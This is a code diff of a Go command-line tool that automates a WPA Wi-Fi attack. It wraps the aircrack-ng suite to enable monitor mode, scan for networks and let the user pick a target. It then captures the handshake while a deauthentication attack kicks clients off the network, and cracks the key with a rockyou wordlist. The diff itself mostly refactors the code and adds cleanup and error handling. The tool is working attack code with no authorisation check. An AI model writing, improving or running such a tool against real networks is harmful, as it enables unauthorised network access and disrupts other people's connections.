@@ -5,9 +5,12 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"os/signal"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/fatih/color"
@@ -28,9 +31,16 @@ var (
 	yellow = color.New(color.FgYellow, color.Bold)
 	red    = color.New(color.FgRed, color.Bold)
 	white  = color.New(color.FgWhite, color.Bold)
+
+	// Global variables for graceful cleanup
+	monIface   string
+	activeCmds []*exec.Cmd
 )
 
 func main() {
+	// Setup graceful termination (Ctrl+C handling)
+	setupSignalHandler()
+
 	// 1. Root check
 	if os.Geteuid() != 0 {
 		red.Println("[!] ERROR: This tool requires root privileges. Please run with 'sudo'.")
@@ -48,29 +58,126 @@ func main() {
 
 	// 3. Interface Input
 	white.Print("\n[*] Enter Wireless Interface (e.g., wlp1s0): ")
-	iface, _ := reader.ReadString('\n')
+	iface, err := reader.ReadString('\n')
+	if err != nil {
+		red.Printf("[-] Failed to read input: %v\n", err)
+		os.Exit(1)
+	}
 	iface = strings.TrimSpace(iface)
-	monIface := iface + "mon"
+	if iface == "" {
+		red.Println("[-] Interface name cannot be empty.")
+		os.Exit(1)
+	}
+
+	// Assumption: airmon-ng appends "mon" (can be made more dynamic, but sufficient for this scope)
+	monIface = iface + "mon"
 
 	yellow.Println("\n[*] Enabling Monitor Mode...")
 	runCmd("airmon-ng", "check", "kill")
 	runCmd("airmon-ng", "start", iface)
 	green.Println("[+] Monitor Mode enabled successfully.")
 
+	// Defer cleanup to ensure we exit cleanly under normal completion
+	defer cleanup()
+
 	// 4. Scanning Networks
+	networks := scanNetworks()
+
+	// 5. Target Selection
+	target := selectTarget(networks, reader)
+
+	// 6. Directory Structure Creation
+	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
+	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_") // Prevent path traversal
+	targetDir := filepath.Join("data", sanitizedEssid)
+
+	yellow.Printf("\n[*] Creating directory for target: %s\n", targetDir)
+	if err := os.MkdirAll(targetDir, 0755); err != nil {
+		red.Printf("[-] ERROR: Failed to create directory: %v\n", err)
+		os.Exit(1)
+	}
+	green.Println("[+] Directory ready.")
+
+	capFile := filepath.Join(targetDir, "handshake")
+
+	// 7. Handshake Capture & Deauth Attack
+	captureHandshake(target, capFile)
+
+	// 8. Password Cracking (Optimized)
+	crackPassword(capFile, targetDir)
+
+	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
+}
+
+func setupSignalHandler() {
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-c
+		fmt.Println()
+		red.Println("\n[!] Interrupted by user. Cleaning up...")
+		cleanup()
+		os.Exit(1)
+	}()
+}
+
+func cleanup() {
+	yellow.Println("\n[*] Performing cleanup operations...")
+
+	// Kill active background processes and prevent zombie processes
+	for _, cmd := range activeCmds {
+		if cmd != nil && cmd.Process != nil {
+			cmd.Process.Kill()
+			cmd.Wait()
+		}
+	}
+	activeCmds = nil // Reset slice
+
+	// Stop monitor mode if it was started
+	if monIface != "" {
+		yellow.Printf("[*] Disabling monitor mode on %s...\n", monIface)
+		runCmd("airmon-ng", "stop", monIface)
+	}
+
+	// Restore NetworkManager
+	yellow.Println("[*] Restarting NetworkManager...")
+	runCmd("systemctl", "start", "NetworkManager")
+
+	// Clean up temp scan files
+	os.Remove("scan_temp-01.csv")
+
+	green.Println("[+] Cleanup complete.")
+}
+
+func scanNetworks() []Network {
 	yellow.Println("\n[*] Scanning networks for 15 seconds...")
 	scanFile := "scan_temp"
-	airodumpCmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
-	airodumpCmd.Stdout = nil
-	airodumpCmd.Stderr = nil
-	airodumpCmd.Start()
+
+	// Remove old temp files if they exist
+	os.Remove(scanFile + "-01.csv")
+
+	cmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	if err := cmd.Start(); err != nil {
+		red.Printf("[-] Failed to start airodump-ng: %v\n", err)
+		cleanup()
+		os.Exit(1)
+	}
+	activeCmds = append(activeCmds, cmd)
+
 	time.Sleep(15 * time.Second)
-	airodumpCmd.Process.Kill()
+
+	if cmd.Process != nil {
+		cmd.Process.Kill()
+		cmd.Wait()
+	}
 	green.Println("[+] Scan completed.")
 
 	networks := parseCSV(scanFile + "-01.csv")
 	if len(networks) == 0 {
 		red.Println("[-] ERROR: No networks found or CSV file not generated.")
+		cleanup()
 		os.Exit(1)
 	}
 
@@ -80,43 +187,50 @@ func main() {
 		fmt.Printf("[%d] ESSID: %s | BSSID: %s | CH: %s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
 	}
 
-	// 5. Target Selection
-	white.Print("\n[*] Enter the number of the target network: ")
-	var choice int
-	fmt.Scanf("%d", &choice)
+	return networks
+}
 
-	if choice < 1 || choice > len(networks) {
-		red.Println("[-] ERROR: Invalid selection.")
-		os.Exit(1)
+func selectTarget(networks []Network, reader *bufio.Reader) Network {
+	for {
+		white.Print("\n[*] Enter the number of the target network: ")
+		input, err := reader.ReadString('\n')
+		if err != nil {
+			red.Printf("[-] Failed to read input: %v\n", err)
+			cleanup()
+			os.Exit(1)
+		}
+
+		input = strings.TrimSpace(input)
+		choice, err := strconv.Atoi(input)
+
+		// Validate user input bounds
+		if err != nil || choice < 1 || choice > len(networks) {
+			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
+			continue
+		}
+
+		target := networks[choice-1]
+		yellow.Printf("\n[*] Target Selected: %s (%s)\n", target.ESSID, target.BSSID)
+		return target
 	}
-	target := networks[choice-1]
+}
 
-	yellow.Printf("\n[*] Target Selected: %s (%s)\n", target.ESSID, target.BSSID)
-
-	// 6. Directory Structure Creation (data/wifi-name)
-	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
-	targetDir := filepath.Join("data", sanitizedEssid)
-
-	yellow.Printf("[*] Creating directory for target: %s\n", targetDir)
-	if err := os.MkdirAll(targetDir, 0755); err != nil {
-		red.Printf("[-] ERROR: Failed to create directory: %v\n", err)
-		os.Exit(1)
-	}
-	green.Println("[+] Directory ready.")
-
-	// Set capture file path inside the new directory
-	capFile := filepath.Join(targetDir, "handshake")
-
-	// 7. Handshake Capture & Deauth Attack
+func captureHandshake(target Network, capFile string) {
 	yellow.Println("[*] Starting Handshake Capture...")
-	captureCmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
-	captureCmd.Stdout = nil
-	captureCmd.Stderr = nil
-	captureCmd.Start()
+
+	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	if err := cmd.Start(); err != nil {
+		red.Printf("[-] Failed to start capture: %v\n", err)
+		cleanup()
+		os.Exit(1)
+	}
+	activeCmds = append(activeCmds, cmd)
 
 	time.Sleep(2 * time.Second) // Wait for airodump to lock channel
-	yellow.Println("[*] Launching Deauth Attack (10 seconds)...")
 
+	yellow.Println("[*] Launching Deauth Attack (10 seconds)...")
 	deauthArgs := []string{"--deauth", "10", "-a", target.BSSID, monIface}
 	if target.Client != "" {
 		deauthArgs = append(deauthArgs, "-c", target.Client)
@@ -124,10 +238,15 @@ func main() {
 	runCmd("aireplay-ng", deauthArgs...)
 
 	time.Sleep(5 * time.Second) // Wait for handshake to save
-	captureCmd.Process.Kill()
-	green.Println("[+] Capture phase completed.")
 
-	// 8. Password Cracking (Optimized)
+	if cmd.Process != nil {
+		cmd.Process.Kill()
+		cmd.Wait()
+	}
+	green.Println("[+] Capture phase completed.")
+}
+
+func crackPassword(capFile string, targetDir string) {
 	finalCapFile := capFile + "-01.cap"
 	cores := runtime.NumCPU()
 
@@ -140,19 +259,12 @@ func main() {
 	fmt.Println()
 
 	runCmd("aircrack-ng", "-p", fmt.Sprintf("%d", cores), "-w", "/usr/share/wordlists/rockyou_clean.txt", finalCapFile)
-
-	// Cleanup only the temporary scan file, KEEP the target files
-	os.Remove("scan_temp-01.csv")
-
-	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
-	red.Println("\n[!] IMPORTANT: Run 'sudo systemctl start NetworkManager' to restore your internet connection.")
 }
 
 // ================= Auto Setup & Optimization Function =================
 func setupEnvironment() {
 	yellow.Println("\n[*] Checking environment dependencies...")
 
-	// Check aircrack-ng
 	if _, err := exec.LookPath("aircrack-ng"); err != nil {
 		red.Println("[-] aircrack-ng not found. Installing...")
 		runCmd("apt", "update")
@@ -161,13 +273,11 @@ func setupEnvironment() {
 		green.Println("[+] aircrack-ng is already installed.")
 	}
 
-	// Check wget
 	if _, err := exec.LookPath("wget"); err != nil {
 		red.Println("[-] wget not found. Installing...")
 		runCmd("apt", "install", "wget", "-y")
 	}
 
-	// Check rockyou.txt
 	wordlistPath := "/usr/share/wordlists/rockyou.txt"
 	if _, err := os.Stat(wordlistPath); os.IsNotExist(err) {
 		red.Println("[-] rockyou.txt not found. Downloading (130MB)...")
@@ -178,18 +288,24 @@ func setupEnvironment() {
 		green.Println("[+] rockyou.txt is already downloaded.")
 	}
 
-	// Optimization: Create Clean Wordlist (length >= 8)
 	cleanWordlistPath := "/usr/share/wordlists/rockyou_clean.txt"
 	if _, err := os.Stat(cleanWordlistPath); os.IsNotExist(err) {
 		yellow.Println("[*] Optimizing Wordlist: Removing passwords shorter than 8 characters...")
-		cleanFile, _ := os.Create(cleanWordlistPath)
+		cleanFile, err := os.Create(cleanWordlistPath)
+		if err != nil {
+			red.Printf("[-] Failed to create clean wordlist: %v\n", err)
+			return
+		}
 		defer cleanFile.Close()
 
 		awkCmd := exec.Command("awk", "length>=8", wordlistPath)
 		awkCmd.Stdout = cleanFile
 		awkCmd.Stderr = os.Stderr
-		awkCmd.Run()
-		green.Println("[+] Optimization complete. 'rockyou_clean.txt' created.")
+		if err := awkCmd.Run(); err != nil {
+			red.Printf("[-] Wordlist optimization failed: %v\n", err)
+		} else {
+			green.Println("[+] Optimization complete. 'rockyou_clean.txt' created.")
+		}
 	} else {
 		green.Println("[+] Optimized wordlist 'rockyou_clean.txt' is ready.")
 	}
